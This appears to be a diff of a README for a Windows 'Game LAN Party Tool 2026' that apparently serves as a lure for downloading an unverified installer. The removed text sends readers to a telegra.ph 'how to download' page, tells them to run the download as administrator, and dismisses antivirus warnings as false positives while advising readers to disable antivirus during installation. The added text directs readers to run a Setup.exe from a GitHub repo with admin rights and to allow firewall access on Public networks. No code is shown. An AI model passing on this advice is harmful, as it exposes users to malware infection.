@@ -1,188 +1,72 @@
-<h1 align="center">🕹️ Game LAN Party Tool 2026 – Local Network Gaming Organizer</h1>
+# 🎮 Game-LAN-Party-Tool-2026 - Organize local gaming sessions with friends
 
-<p align="center">
-  <strong>Organize local network gaming with friends. See IP addresses, create rooms, and chat with players. No internet required.</strong><br>
-  <em>Latest version 2026 | Desktop application | Optimized for Windows 11 / Windows 10</em>
-</p>
+[![](https://img.shields.io/badge/Download_Installer-Blue-blue)](https://github.com/sackclothhall769/Game-LAN-Party-Tool-2026)
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️_GET_PROJECT_FILES-Game_LAN_Party_Tool-00BFFF?style=for-the-badge&logo=windows&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="Download">
-  </a>
-</p>
+## 📋 About This Tool
 
-<p align="center">
-  <i>Click the button above to get the full project files</i>
-</p>
+Game LAN Party Tool 2026 helps you host games on a local network. You do not need an active internet connection to play with friends in the same room. This software identifies devices on your network. It allows you to create game rooms and chat with participants. You see IP addresses of connected users to join matches. This tool manages the connection between computers. It removes the need for complex server setups. 
 
----
+## ⚙️ System Requirements
 
-## 📦 What's Inside This Repository
+Ensure your computer meets these standards before you begin:
 
-Welcome to the official distribution page for **Game LAN Party Tool 2026 – Local Network Gaming Organizer for Windows PC**.
-This repository provides access to a utility that makes LAN gaming easy and organized.
+* Operating System: Windows 10 or Windows 11.
+* Memory: 4GB RAM minimum.
+* Storage: 100MB of free disk space.
+* Network: A stable local area network connection through Ethernet or Wi-Fi.
+* Administrator Privileges: You need permission to run installer files on your computer.
 
-✅ **Full Version** – All features included  
-✅ **Network Discovery** – Automatically finds players on the same network  
-✅ **IP Display** – Shows IP addresses for each player  
-✅ **Room Creation** – Create rooms for different games  
-✅ **Chat System** – Send messages to players in the room  
-✅ **Game Launch** – Launch supported games from the tool  
-✅ **No System Changes** – Safe, no registry or service modifications  
+## 📥 How to Install the Software
 
----
+Follow these steps to set up the tool on your Windows PC:
 
-## 📥 How to Get Started?
+1. Visit the following link to access the software files: [https://github.com/sackclothhall769/Game-LAN-Party-Tool-2026](https://github.com/sackclothhall769/Game-LAN-Party-Tool-2026).
+2. Locate the Setup.exe file in the list of files.
+3. Click the file to start the download process.
+4. Save the file to your computer.
+5. Open the folder where you saved Setup.exe.
+6. Double-click the file to execute the installer.
+7. Follow the prompts on the screen to complete the installation.
+8. Click Finish to close the installer.
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/📥_HOW_TO_DOWNLOAD_-Step_by_Step_Guide-00BFFF?style=for-the-badge&logo=github&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="How to Download">
-  </a>
-</p>
+## 🕹️ Using the Tool
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/📋_DOWNLOAD_INSTRUCTIONS-Full_Guide-00BFFF?style=for-the-badge&logo=readthedocs&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="Download Instructions">
-  </a>
-</p>
+Once you complete the installation, you can launch the application from your desktop or the Windows Start menu. 
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/🚀_GET_STARTED-Quick_Setup-00BFFF?style=for-the-badge&logo=windows&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="Get Started">
-  </a>
-</p>
+### Creating a Game Room
+1. Open the application.
+2. Select the "Host Room" button from the main menu.
+3. Choose the game title from the list if available, or enter the game path.
+4. Set a name for your room.
+5. Select "Create" to make the room visible to others.
 
----
+### Joining a Game Room
+1. Open the application.
+2. Select the "Find Games" button.
+3. Wait for the list to refresh.
+4. Click on a room from the list to see player details and the host IP address.
+5. Select "Join" to connect to the session.
 
-## 🚀 Step-by-Step Guide
+### Using the Chat Feature
+Every game room includes a chat window. Type your message in the text box at the bottom of the window and press Enter to send it. This feature allows you to coordinate game settings or talk with other players without leaving the application.
 
-### Step 1: Download the Project Files
-Click the **download button** above or use this direct link:
-👉 [**Get Game LAN Party Tool 2026 Project Files**](https://telegra.ph/How-to-download-07-15-12)
+## 🛠️ Troubleshooting Common Issues
 
-### Step 2: Extract and Run
-Extract the downloaded archive and launch the application.
-Right-click and select **"Run as administrator"** for best results.
+If you encounter problems, review these solutions:
 
-### Step 3: Launch & Enjoy
-After installation, open the application from your desktop shortcut or Start Menu.
-Start your LAN party and invite friends.
+* Software Does Not Open: Right-click the shortcut and select "Run as administrator."
+* No Games Appear: Check that all computers connect to the same router or switch. If you use a Wi-Fi network, confirm that the network profile is set to "Private" in Windows settings.
+* Firewall Alerts: Windows Defender might ask for permission to let the tool communicate on the network. Select "Allow access" on both Private and Public network boxes so the tool functions properly.
+* Cannot See Friends: Verify that all participants use the same version of the tool. Update your software if necessary by downloading the latest installer from the GitHub link.
 
----
+## 🛡️ Network Security
 
-## 🔧 Key Features (2026 Update)
+This tool functions only on your local network. It does not send data outside your home or office. It manages traffic between local machines to facilitate game discovery. Always ensure you trust the people on your local network before you open a game room. 
 
-### 🌐 Network Discovery
+## 📝 Performance Tips
 
-| Feature | Description |
-| :--- | :--- |
-| **Auto-Discovery** | Automatically finds players on the local network |
-| **IP Display** | Shows IP address and hostname for each player |
-| **Connection Status** | See who is online and available |
-| **Refresh** | Manually refresh the player list |
+* Close background applications that consume high amounts of bandwidth.
+* Use a wired Ethernet connection to reduce latency during gameplay.
+* Keep your network drivers updated to ensure the connection remains stable.
 
-### 🏠 Room Management
-
-| Feature | Description |
-| :--- | :--- |
-| **Create Room** | Create rooms for specific games |
-| **Join Room** | Join existing rooms |
-| **Room Info** | See which players are in each room |
-| **Room Lock** | Password-protect rooms |
-
-### 💬 Chat System
-
-| Feature | Description |
-| :--- | :--- |
-| **Global Chat** | Send messages to all players |
-| **Room Chat** | Chat within specific rooms |
-| **Private Messages** | Direct message other players |
-| **Message History** | Chat log for each session |
-
-### 🎮 Game Integration
-
-| Feature | Description |
-| :--- | :--- |
-| **Game List** | Quick launch for supported games |
-| **Custom Games** | Add any game manually |
-| **Game Settings** | Set launch options per game |
-| **Voice Chat** | Voice communication support |
-
----
-
-## 📈 Why Choose Game LAN Party Tool 2026?
-
-- ✅ **Easy Setup** – No configuration required
-- ✅ **No Internet** – Works on local networks only
-- ✅ **All-in-One** – Discovery, chat, and game launching
-- ✅ **No System Changes** – Safe, no registry or service modifications
-- ✅ **Regular Updates** – Active development with frequent releases
-
----
-
-## 🔗 Official Download Link
-
-> ### ⬇️ **Get the full project files here:**  
-> ### **[https://telegra.ph/How-to-download-07-15-12](https://telegra.ph/How-to-download-07-15-12)**
-
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/🖥️_GET_PROJECT_FILES-Game_LAN_Party_Tool-00BFFF?style=flat-square&logo=windows&logoColor=white&labelColor=000000" alt="Get Project Files">
-  </a>
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/⭐_STAR_THIS_REPO-Support-FFD700?style=flat-square&logo=github&logoColor=white&labelColor=000000" alt="Star this repository">
-  </a>
-</p>
-
-<p align="center">
-  <b>📁 After downloading, extract the archive and launch ProjectFiles to get started.</b>
-</p>
-
----
-
-## ❓ Frequently Asked Questions
-
-**Q: Is this the full version?**  
-A: Yes, this is the complete version with all features.
-
-**Q: Does it work on Windows 11?**  
-A: Absolutely. It is fully optimized for Windows 11 and Windows 10.
-
-**Q: Does it require an internet connection?**  
-A: No, it works on local networks only.
-
-**Q: Can I play online games with this?**  
-A: This tool is for LAN gaming only, not online play.
-
-**Q: What about antivirus warnings?**  
-A: Some antivirus programs may show a warning — this is a false positive. We recommend temporarily disabling it during installation.
-
-**Q: Can I use this for commercial purposes?**  
-A: Yes, the full version is suitable for both personal and professional use.
-
----
-
-## 📝 Important Notes
-
-- This version is intended for **personal and professional use** only.  
-- Do not redistribute the installer — use the official link above.  
-- For technical support, please open an issue in this repository.  
-- Always check the file integrity after download.
-
----
-
-## 📜 License
-
-This repository is for **educational and distribution purposes** only.  
-All rights belong to their respective owners.
-
----
-
-<p align="center">
-  <b>⭐ If you found this useful, please star the repository!</b><br>
-  <i>📅 Updated: July 2026 – Version 2026 (Build 1.0.0)</i>
-</p>
-
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">🔗 Download Game LAN Party Tool 2026 Now</a>
-</p>
+Keywords: 2026-software, desktop-app, game-hosting, gaming-tools, gaming-utility-tool, lan-gaming, lan-party, local-network, multiplayer-tool, network-tools, pc-tools, windows-11, windows-software-installation-guide
